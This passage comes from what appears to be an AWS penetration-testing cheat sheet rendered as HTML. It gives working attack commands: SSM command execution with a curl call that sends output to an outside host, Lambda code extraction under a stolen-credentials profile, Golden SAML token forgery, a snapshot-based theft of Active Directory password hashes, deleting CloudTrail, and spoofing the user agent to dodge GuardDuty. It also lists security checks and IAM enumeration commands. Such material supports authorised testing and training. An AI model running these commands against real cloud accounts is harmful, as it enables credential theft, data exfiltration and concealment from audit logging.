<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="c"># create ec2 using the previously created AMI, use the same security group and subnet to connect easily.</span>
<a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ec2</span> <span class="n">run-instances</span> <span class="p">-</span><span class="n">-image-id</span> <span class="n">ami</span><span class="p">-</span><span class="n">0b77e2d906b00202d</span> <span class="p">-</span><span class="n">-security-group-ids</span> <span class="s2">&quot;sg-6d0d7f01&quot;</span> <span class="p">-</span><span class="n">-subnet-id</span> <span class="n">subnet</span><span class="p">-</span><span class="n">9eb001ea</span> <span class="p">-</span><span class="n">-count</span> <span class="n">1</span> <span class="p">-</span><span class="n">-instance-type</span> <span class="n">t2</span><span class="p">.</span><span class="n">micro</span> <span class="p">-</span><span class="n">-key-name</span> <span class="s2">&quot;AWS Audit&quot;</span> <span class="p">-</span><span class="n">-query</span> <span class="s2">&quot;Instances[0].InstanceId&quot;</span> <span class="p">-</span><span class="n">-region</span> <span class="n">eu-west</span><span class="p">-</span><span class="n">1</span>
<a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>
<a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="c"># now you can check the instance </span>
<a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a><span class="n">aws</span> <span class="n">ec2</span> <span class="n">describe-instances</span> <span class="p">-</span><span class="n">-instance-ids</span> <span class="n">i</span><span class="p">-</span><span class="n">0546910a0c18725a1</span> 
<a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>
<a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a><span class="c"># If needed : edit groups</span>
<a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a><span class="n">aws</span> <span class="n">ec2</span> <span class="n">modify-instance-attribute</span> <span class="p">-</span><span class="n">-instance-id</span> <span class="s2">&quot;i-0546910a0c18725a1&quot;</span> <span class="p">-</span><span class="n">-groups</span> <span class="s2">&quot;sg-6d0d7f01&quot;</span>  <span class="p">-</span><span class="n">-region</span> <span class="n">eu-west</span><span class="p">-</span><span class="n">1</span>
<a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a>
<a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a><span class="c"># be a good guy, clean our instance to avoid any useless cost</span>
<a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a><span class="n">aws</span> <span class="n">ec2</span> <span class="nb">stop-instances</span> <span class="p">-</span><span class="n">-instance-id</span> <span class="s2">&quot;i-0546910a0c18725a1&quot;</span> <span class="p">-</span><span class="n">-region</span> <span class="n">eu-west</span><span class="p">-</span><span class="n">1</span> 
<a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a><span class="n">aws</span> <span class="n">ec2</span> <span class="n">terminate-instances</span> <span class="p">-</span><span class="n">-instance-id</span> <span class="s2">&quot;i-0546910a0c18725a1&quot;</span> <span class="p">-</span><span class="n">-region</span> <span class="n">eu-west</span><span class="p">-</span><span class="n">1</span>
</code></pre></div>
<h2 id="aws-instance-connect-push-an-ssh-key-to-ec2-instance">AWS - Instance Connect - Push an SSH key to EC2 instance</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c"># https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/</span>
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ec2</span> <span class="n">describe-instances</span> <span class="p">-</span><span class="n">-profile</span> <span class="n">uploadcreds</span> <span class="p">-</span><span class="n">-region</span> <span class="n">eu-west</span><span class="p">-</span><span class="n">1</span> <span class="p">|</span> <span class="n">jq</span> <span class="s2">&quot;.[][].Instances | .[] | {InstanceId, KeyName, State}&quot;</span>
<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ec2-instance-connect</span> <span class="nb">send-ssh</span><span class="n">-public-key</span> <span class="p">-</span><span class="n">-region</span> <span class="n">us-east</span><span class="p">-</span><span class="n">1</span> <span class="p">-</span><span class="n">-instance-id</span> <span class="n">INSTANCE</span> <span class="p">-</span><span class="n">-availability-zone</span> <span class="n">us-east</span><span class="p">-</span><span class="n">1d</span> <span class="p">-</span><span class="n">-instance-os-user</span> <span class="n">ubuntu</span> <span class="p">-</span><span class="n">-ssh-public-key</span> <span class="n">file</span><span class="p">://</span><span class="n">shortkey</span><span class="p">.</span><span class="n">pub</span> <span class="p">-</span><span class="n">-profile</span> <span class="n">uploadcreds</span>
</code></pre></div>
<h2 id="aws-lambda-extract-functions-code">AWS - Lambda - Extract function's code</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c"># https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed</span>
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">lambda</span> <span class="n">list-functions</span> <span class="p">-</span><span class="n">-profile</span> <span class="n">uploadcreds</span>
<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">lambda</span> <span class="nb">get-function</span> <span class="p">-</span><span class="n">-function-name</span> <span class="s2">&quot;LAMBDA-NAME-HERE-FROM-PREVIOUS-QUERY&quot;</span> <span class="p">-</span><span class="n">-query</span> <span class="s1">&#39;Code.Location&#39;</span> <span class="p">-</span><span class="n">-profile</span> <span class="n">uploadcreds</span>
<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="p">$</span> <span class="nb">wget </span><span class="n">-O</span> <span class="n">lambda-function</span><span class="p">.</span><span class="n">zip</span> <span class="n">url-from-previous-query</span> <span class="p">-</span><span class="n">-profile</span> <span class="n">uploadcreds</span>
</code></pre></div>
<h2 id="aws-ssm-command-execution">AWS - SSM - Command execution</h2>
<p><img alt="" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> The ssm-user account is not removed from the system when SSM Agent is uninstalled.</p>
<p>SSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs):
* Windows Server 2008-2012 R2 AMIs published in November 2016 or later
* Windows Server 2016 and 2019
* Amazon Linux
* Amazon Linux 2
* Ubuntu Server 16.04
* Ubuntu Server 18.04
* Amazon ECS-Optimized</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ssm</span> <span class="n">describe-instance-information</span> <span class="p">-</span><span class="n">-profile</span> <span class="n">stolencreds</span> <span class="p">-</span><span class="n">-region</span> <span class="n">eu-west</span><span class="p">-</span><span class="n">1</span>  
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ssm</span> <span class="nb">send-command</span> <span class="p">-</span><span class="n">-instance-ids</span> <span class="s2">&quot;INSTANCE-ID-HERE&quot;</span> <span class="p">-</span><span class="n">-document-name</span> <span class="s2">&quot;AWS-RunShellScript&quot;</span> <span class="p">-</span><span class="n">-comment</span> <span class="s2">&quot;IP Config&quot;</span> <span class="p">-</span><span class="n">-parameters</span> <span class="n">commands</span><span class="p">=</span><span class="n">ifconfig</span> <span class="p">-</span><span class="n">-output</span> <span class="n">text</span> <span class="p">-</span><span class="n">-query</span> <span class="s2">&quot;Command.CommandId&quot;</span> <span class="p">-</span><span class="n">-profile</span> <span class="n">stolencreds</span>
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ssm</span> <span class="n">list-command-invocations</span> <span class="p">-</span><span class="n">-command-id</span> <span class="s2">&quot;COMMAND-ID-HERE&quot;</span> <span class="p">-</span><span class="n">-details</span> <span class="p">-</span><span class="n">-query</span> <span class="s2">&quot;CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}&quot;</span> <span class="p">-</span><span class="n">-profile</span> <span class="n">stolencreds</span>
<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>
<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="n">e</span><span class="p">.</span><span class="n">g</span><span class="p">:</span>
<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ssm</span> <span class="nb">send-command</span> <span class="p">-</span><span class="n">-instance-ids</span> <span class="s2">&quot;i-05badaa&quot;</span> <span class="p">-</span><span class="n">-document-name</span> <span class="s2">&quot;AWS-RunShellScript&quot;</span> <span class="p">-</span><span class="n">-comment</span> <span class="s2">&quot;whoami&quot;</span> <span class="p">-</span><span class="n">-parameters</span> <span class="n">commands</span><span class="p">=</span><span class="s1">&#39;curl 162.243..:8080/`whoami`&#39;</span> <span class="p">-</span><span class="n">-output</span> <span class="n">text</span> <span class="p">-</span><span class="n">-region</span><span class="p">=</span><span class="n">us-east</span><span class="p">-</span><span class="n">1</span>
</code></pre></div>
<h2 id="aws-golden-saml-attack">AWS - Golden SAML Attack</h2>
<p>https://www.youtube.com/watch?v=5dj4vOqqGZw  <br />
https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-cloud-apps/</p>
<blockquote>
<p>Using the extracted information, the tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without knowledge of that user's password. This attack also bypasses any MFA requirements. </p>
</blockquote>
<p>Requirement:
* Token-signing private key (export from personal store using Mimikatz)
* IdP public certificate
* IdP name
* Role name (role to assume)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="p">$</span> <span class="n">python</span> <span class="n">-m</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">boto3</span> <span class="n">botocore</span> <span class="n">defusedxml</span> <span class="n">enum</span> <span class="n">python_dateutil</span> <span class="n">lxml</span> <span class="n">signxml</span>
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="p">$</span> <span class="n">python</span> <span class="p">.\</span><span class="n">shimit</span><span class="p">.</span><span class="n">py</span> <span class="n">-idp</span> <span class="n">http</span><span class="p">://</span><span class="n">adfs</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">adfs</span><span class="p">/</span><span class="n">services</span><span class="p">/</span><span class="n">trust</span> <span class="n">-pk</span> <span class="n">key_file</span> <span class="n">-c</span> <span class="n">cert_file</span>
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="n">-u</span> <span class="n">domain</span><span class="p">\</span><span class="n">admin</span> <span class="n">-n</span> <span class="n">admin</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span> <span class="n">-r</span> <span class="n">ADFS-admin</span> <span class="n">-r</span> <span class="n">ADFS-monitor</span> <span class="n">-id</span> <span class="n">123456789012</span>
</code></pre></div>
<h2 id="aws-shadow-copy-attack">AWS - Shadow Copy attack</h2>
<p>Prerequisite:
* EC2:CreateSnapshot
* CloudCopy - https://github.com/Static-Flow/CloudCopy</p>
<ol>
<li>Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions</li>
<li>Run <code>"Describe-Instances"</code> and show in list for attacker to select</li>
<li>Run <code>"Create-Snapshot"</code> on volume of selected instance</li>
<li>Run <code>"modify-snapshot-attribute"</code> on new snapshot to set <code>"createVolumePermission"</code> to attacker AWS Account</li>
<li>Load AWS CLI with Attacker Credentials</li>
<li>Run <code>"run-instance"</code> command to create new linux ec2 with our stolen snapshot</li>
<li>Ssh run <code>"sudo mkdir /windows"</code></li>
<li>Ssh run <code>"sudo mount /dev/xvdf1 /windows/"</code></li>
<li>Ssh run <code>"sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user"</code></li>
<li>Ssh run <code>"sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user"</code></li>
<li>Ssh run <code>"sudo chown ec2-user:ec2-user /home/ec2-user/*"</code></li>
<li>SFTP get <code>"/home/ec2-user/SYSTEM ./SYSTEM"</code></li>
<li>SFTP get <code>"/home/ec2-user/ntds.dit ./ntds.dit"</code></li>
<li>locally run <code>"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets'</code>, expects secretsdump to be on path</li>
</ol>
<h2 id="disable-cloudtrail">Disable CloudTrail</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">cloudtrail</span> <span class="n">delete-trail</span> <span class="p">-</span><span class="n">-name</span> <span class="n">cloudgoat_trail</span> <span class="p">-</span><span class="n">-profile</span> <span class="n">administrator</span>
</code></pre></div>
<p>Disable monitoring of events from global services </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">cloudtrail</span> <span class="nb">update-trail</span> <span class="p">-</span><span class="n">-name</span> <span class="n">cloudgoat_trail</span> <span class="p">-</span><span class="n">-no-include-global-service-event</span> 
</code></pre></div>
<p>Disable Cloud Trail on specific regions</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">cloudtrail</span> <span class="nb">update-trail</span> <span class="p">-</span><span class="n">-name</span> <span class="n">cloudgoat_trail</span> <span class="p">-</span><span class="n">-no-include-global-service-event</span> <span class="p">-</span><span class="n">-no</span><span class="o">-is</span><span class="n">-multi-region</span> <span class="p">-</span><span class="n">-region</span><span class="p">=</span><span class="n">eu-west</span>
</code></pre></div>
<h2 id="cover-tracks-by-obfuscating-cloudtrail-logs-and-guard-duty">Cover tracks by obfuscating Cloudtrail logs and Guard Duty</h2>
<p><img alt="" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> When using awscli on Kali Linux, Pentoo and Parrot Linux, a log is generated based on the user-agent.</p>
<p>Pacu bypass this problem by defining a custom User-Agent (https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu.py#L1473)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="n">boto3_session</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="n">ua</span> <span class="o">=</span> <span class="n">boto3_session</span><span class="o">.</span><span class="n">_session</span><span class="o">.</span><span class="n">user_agent</span><span class="p">()</span>
<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="k">if</span> <span class="s1">&#39;kali&#39;</span> <span class="ow">in</span> <span class="n">ua</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">or</span> <span class="s1">&#39;parrot&#39;</span> <span class="ow">in</span> <span class="n">ua</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">or</span> <span class="s1">&#39;pentoo&#39;</span> <span class="ow">in</span> <span class="n">ua</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>  <span class="c1"># If the local OS is Kali/Parrot/Pentoo Linux</span>
<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>    <span class="c1"># GuardDuty triggers a finding around API calls made from Kali Linux, so let&#39;s avoid that...</span>
<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>    <span class="bp">self</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="s1">&#39;Detected environment as one of Kali/Parrot/Pentoo Linux. Modifying user agent to hide that from GuardDuty...&#39;</span><span class="p">)</span>
</code></pre></div>
<h2 id="dynamodb">DynamoDB</h2>
<blockquote>
<p>Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second.</p>
</blockquote>
<ul>
<li>
<p>list tables
<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>$<span class="w"> </span>aws<span class="w"> </span>--endpoint-url<span class="w"> </span>http://s3.bucket.htb<span class="w"> </span>dynamodb<span class="w"> </span>list-tables<span class="w">        </span>
<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>
<a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="o">{</span>
<a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="w">    </span><span class="s2">&quot;TableNames&quot;</span>:<span class="w"> </span><span class="o">[</span>
<a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="w">        </span><span class="s2">&quot;users&quot;</span>
<a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="w">    </span><span class="o">]</span>
<a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="o">}</span>
</code></pre></div></p>
</li>
<li>
<p>enumerate table content
<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>$<span class="w"> </span>aws<span class="w"> </span>--endpoint-url<span class="w"> </span>http://s3.bucket.htb<span class="w"> </span>dynamodb<span class="w"> </span>scan<span class="w"> </span>--table-name<span class="w"> </span>users<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.Items[]&#39;</span>
<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>
<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="o">{</span>
<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="w">  </span><span class="s2">&quot;password&quot;</span>:<span class="w"> </span><span class="o">{</span>
<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="w">    </span><span class="s2">&quot;S&quot;</span>:<span class="w"> </span><span class="s2">&quot;Management@#1@#&quot;</span>
<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="w">  </span><span class="o">}</span>,
<a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="w">  </span><span class="s2">&quot;username&quot;</span>:<span class="w"> </span><span class="o">{</span>
<a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="w">    </span><span class="s2">&quot;S&quot;</span>:<span class="w"> </span><span class="s2">&quot;Mgmt&quot;</span>
<a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="w">  </span><span class="o">}</span>
<a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="o">}</span>
</code></pre></div></p>
</li>
</ul>
<h2 id="security-checks">Security checks</h2>
<p>Security checks from <a href="https://github.com/DenizParlak/Zeus">DenizParlak/Zeus: AWS Auditing &amp; Hardening Tool</a></p>
<ul>
<li>Identity and Access Management</li>
<li>Avoid the use of the "root" account</li>
<li>Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password</li>
<li>Ensure credentials unused for 90 days or greater are disabled</li>
<li>Ensure access keys are rotated every 90 days or less</li>
<li>Ensure IAM password policy requires at least one uppercase letter</li>
<li>Ensure IAM password policy requires at least one lowercase letter</li>
<li>Ensure IAM password policy requires at least one symbol</li>
<li>Ensure IAM password policy requires at least one number</li>
<li>Ensure IAM password policy requires minimum length of 14 or greater</li>
<li>Ensure no root account access key exists</li>
<li>Ensure MFA is enabled for the "root" account</li>
<li>Ensure security questions are registered in the AWS account</li>
<li>Ensure IAM policies are attached only to groups or role</li>
<li>Enable detailed billing</li>
<li>Maintain current contact details</li>
<li>Ensure security contact information is registered</li>
<li>Ensure IAM instance roles are used for AWS resource access from instances</li>
<li>Logging</li>
<li>Ensure CloudTrail is enabled in all regions</li>
<li>Ensure CloudTrail log file validation is enabled</li>
<li>Ensure the S3 bucket CloudTrail logs to is not publicly accessible</li>
<li>Ensure CloudTrail trails are integrated with CloudWatch Logs</li>
<li>Ensure AWS Config is enabled in all regions</li>
<li>Ensure S3 bucket access logging is enabled on the CloudTrail S3 bucket</li>
<li>Ensure CloudTrail logs are encrypted at rest using KMS CMKs</li>
<li>Ensure rotation for customer created CMKs is enabled</li>
<li>Networking</li>
<li>Ensure no security groups allow ingress from 0.0.0.0/0 to port 22</li>
<li>Ensure no security groups allow ingress from 0.0.0.0/0 to port 3389</li>
<li>Ensure VPC flow logging is enabled in all VPC</li>
<li>Ensure the default security group of every VPC restricts all traffic</li>
<li>Monitoring</li>
<li>Ensure a log metric filter and alarm exist for unauthorized API calls</li>
<li>Ensure a log metric filter and alarm exist for Management Consolesign-in without MFA</li>
<li>Ensure a log metric filter and alarm exist for usage of "root" account</li>
<li>Ensure a log metric filter and alarm exist for IAM policy changes</li>
<li>Ensure a log metric filter and alarm exist for CloudTrail configuration changes</li>
<li>Ensure a log metric filter and alarm exist for AWS Management Console authentication failures</li>
<li>Ensure a log metric filter and alarm exist for disabling or scheduled deletion of customer created CMKs</li>
<li>Ensure a log metric filter and alarm exist for S3 bucket policy changes</li>
<li>Ensure a log metric filter and alarm exist for AWS Config configuration changes</li>
<li>Ensure a log metric filter and alarm exist for security group changes</li>
<li>Ensure a log metric filter and alarm exist for changes to NetworkAccess Control Lists (NACL)</li>
<li>Ensure a log metric filter and alarm exist for changes to network gateways</li>
<li>Ensure a log metric filter and alarm exist for route table changes</li>
<li>Ensure a log metric filter and alarm exist for VPC changes</li>
</ul>
<h2 id="awsome-pentesting-cheatsheet">AWSome Pentesting Cheatsheet</h2>
<ul>
<li>Created by pop3ret</li>
</ul>
<h2 id="searching-for-open-buckets">Searching for open buckets</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>https://buckets.grayhatwarfare.com/
</code></pre></div>
<h2 id="arn">ARN</h2>
<p>A number to identify an object in AWS</p>
<p>Example</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>arn:aws:iam:100:user/admin
</code></pre></div>
<ol>
<li>Field -&gt; ARN</li>
<li>Field -&gt; Type, most of time will be AWS</li>
<li>Field -&gt; service, in this case IAM</li>
<li>Field -&gt; User ID </li>
<li>Field -&gt; entity identifier</li>
</ol>
<h2 id="iam">IAM</h2>
<ul>
<li>It's assumed that we have gain access to the AWS Credentials</li>
<li>We can see if we have permissions using <a href="**[https://policysim.aws.amazon.com/](https://policysim.aws.amazon.com/)**">Amazon's policy simulator</a></li>
<li>Always look for policies and roles with the * symbol.</li>
<li>See which user do not have MFA enabled</li>
<li>User enumeration in IAM Panel and group enumeration</li>
<li>We can also enumerate roles from the same interface</li>
<li>Root user is super admin</li>
</ul>
<h2 id="configure-aws-cli">Configure AWS cli</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>aws configure
</code></pre></div>
<p>Or configure it using a profile</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>aws configure --profile example_name
</code></pre></div>
<p>The credential file is located in <code>~/.aws/credentials</code></p>
<h2 id="listing-iam-access-keys">Listing IAM access Keys</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>aws iam list-access-keys
</code></pre></div>
<h2 id="1-enumerating-iam-users">1. Enumerating IAM users</h2>
<h3 id="checking-credentials-for-the-user">Checking credentials for the user</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>aws sts get-caller-identity
</code></pre></div>
<h3 id="listing-iam-users">Listing IAM Users</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>aws iam list-users
</code></pre></div>
<h3 id="listing-the-iam-groups-that-the-specified-iam-user-belongs-to">Listing the IAM groups that the specified IAM user belongs to</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>aws iam list-groups-for-user --user-name user-name
</code></pre></div>
<h3 id="listing-all-manages-policies-that-are-attached-to-the-specified-iam-user">Listing all manages policies that are attached to the specified IAM user</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>aws iam list-attached-user-policies --user-name user-name
</code></pre></div>
<h3 id="listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-user">Listing the names of the inline policies embedded in the specified IAM user</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>aws iam list-user-policies --user-name user-name
</code></pre></div>
<h2 id="2-enumerating-groups-iam">2. Enumerating Groups IAM</h2>
<h3 id="listing-iam-groups">Listing IAM Groups</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>aws iam list-groups
</code></pre></div>
<h3 id="listing-all-managed-policies-that-are-attached-to-the-specified-iam-group">Listing all managed policies that are attached to the specified IAM Group</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>aws iam list-attached-group-policies --group-name group-name
</code></pre></div>
<h3 id="listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-group">Listing the names of the inline policies embedded in the specified IAM Group</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>aws iam list-group-policies --group-name group name
</code></pre></div>
<h2 id="3-enumeratig-roles">3. Enumeratig Roles</h2>
<h3 id="listing-iam-roles">Listing IAM Roles</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>aws iam list-roles
</code></pre></div>
<h3 id="listsing-all-managed-policies-that-are-attached-to-the-specified-iam-role">Listsing all managed policies that are attached to the specified IAM role</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>aws iam list-attached-role-policies --role-name role-name
</code></pre></div>
<h3 id="listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-role">Listing the names of the inline policies embedded in the specified IAM role</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>aws iam list-role-policies --role-name role-name
</code></pre></div>
<h2 id="4-enumerating-policies">4. Enumerating Policies</h2>
<h3 id="listing-of-iam-policies">Listing of IAM Policies</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>aws iam list-policies
</code></pre></div>
<h3 id="retrieving-information-about-the-specified-managed-policy">Retrieving information about the specified managed policy</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>aws iam get-policy --policy-arn policy-arn
</code></pre></div>
<h3 id="listing-information-about-the-versions-of-the-specified-manages-policy">Listing information about the versions of the specified manages policy</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>aws iam list-policy-versions --policy-arn policy-arn
</code></pre></div>
<h3 id="retrieving-information-about-the-specific-version-of-the-specified-managed-policy">Retrieving information about the specific version of the specified managed policy</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>aws iam get-policy-version --policy-arn policy-arn --version-id version-id
</code></pre></div>
<h3 id="retrieving-the-specified-inline-policy-document-that-is-embedded-on-the-specified-iam-user-group-role">Retrieving the specified inline policy document that is embedded on the specified IAM user / group / role</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>aws iam get-user-policy --user-name user-name --policy-name policy-name
<a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>
<a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>aws iam get-group-policy --group-name group-name --policy-name policy-name
<a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>
<a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>aws iam get-role-policy --role-name role-name --policy-name policy-name
</code></pre></div>
<h2 id="5-exploitation-scenario">5. Exploitation Scenario</h2>
<h3 id="general-guidelines">General Guidelines</h3>
